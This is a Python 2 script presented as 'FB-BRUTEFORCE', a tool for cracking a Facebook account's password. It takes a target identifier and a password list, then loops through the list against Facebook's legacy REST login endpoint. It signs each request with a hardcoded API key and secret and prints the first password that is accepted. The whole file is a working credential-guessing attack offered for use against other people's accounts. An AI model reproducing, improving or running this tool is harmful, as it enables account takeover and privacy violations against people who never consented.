## FB_BRUTEFORCE - FACEBOOK BRUTEFORCE HACK PASSWORD
# -*- coding:utf-8 -*-
##
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   FB-BRUTEFORCE v20.1.3       $
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$CODED BY PRINCE GUTIERREZ.     $
$GITHUB:-PENTESTRATER.          $
$FACEBOOK ACCOUNT PENTESTRATER  $
$PLEASE SUPPORT ME.             $
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

"""

print("[+] FB-BRUTEFORCE \n")
userid = raw_input("[*] TYPE USERNAME/PHONE NUMBER/EMAIL ")
try:
	passlist = raw_input("[*] Set PATH to passlist: ")
	if os.path.exists(passlist) != False:
		print(__banner__)
		print(" [+] I WILL CRACK THIS ACCOUNT : {}".format(userid))
		print(" [+] OPENING PASSLIST : {}".format(len(open(passlist,"r").read().split("\n"))))
		print(" [+] BRUTEFORCING THE ACCOUNT PLEASE WAIT A FEW MINUTES PP")
		for passwd in open(passlist,'r').readlines():
			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
			sys.stdout.flush()
			sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
			xx = hashlib.md5(sig).hexdigest()
			data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
			response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
			if "error" in response:
				pass
			else:
				print("\n\n[+] PASSWORD FINISHED BRUTEFORCING!!")
				print("\n[+] PASSWORD: {}".format(passwd.strip()))
				break
		print("\n\n[!] Finished  SUPPORT ME")
	else:
		print("FB BRUTEFORCE: error: No such file or directory")
except KeyboardInterrupt:
	print("FB-BRUTEFORCE: error: Keyboard interrupt")
